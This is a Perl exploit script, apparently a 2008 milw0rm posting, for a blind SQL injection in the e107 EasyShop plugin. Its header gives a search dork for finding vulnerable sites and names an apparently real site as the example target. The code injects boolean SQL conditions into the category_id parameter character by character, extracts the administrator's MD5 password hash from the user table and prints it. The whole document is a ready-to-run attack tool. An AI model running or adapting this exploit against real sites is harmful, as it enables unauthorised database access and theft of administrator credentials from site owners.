#!/usr/bin/perl
# ------------------------------------------------------------
# e107 (Plugin EasyShop) Remote Blind SQL Injection Exploit
# By StAkeR[at]hotmail[dot]it  
# Dork allinurl: e107_plugins/easyshop/easyshop.php
# Example http://www.clan-designs.co.uk
# easyshop/easyshop.php?choose_category=1&category_id= or 1=1
# easyshop/easyshop.php?choose_category=1&category_id= and 1=2
# ------------------------------------------------------------

use strict;
use warnings;
use LWP::UserAgent;
use URI::Escape;

my ($request,$send,$ord,$hash,$uid) = (undef,undef,undef,undef,1);

my $host = shift @ARGV or die "[?] Usage: perl $0 http://[host]\n";
my @chars = (48..57, 97..102); 
my $http = new LWP::UserAgent;

for(0..32)
{
   foreach $ord(@chars) 
   {
      $send = " or ascii(substring((select user_password from e107_user where user_id=1),$uid,1))=$ord/*";
      $send = uri_escape($send);
    
      $request = $http->get($host."/e107_plugins/easyshop/easyshop.php?choose_category=1&category_id=-1".$send);
    
     if($request->is_success and $request->content !~ /No products available/i)
     {
        $hash .= chr($ord); 
        $uid++;
     }
   }
}

if(defined $hash)
{
   print STDOUT "[+] MD5: $hash\n";
   exit;
}
else
{
   print STDOUT "[?] Exploit Failed!\n";
   exit;
}

# milw0rm.com [2008-10-27]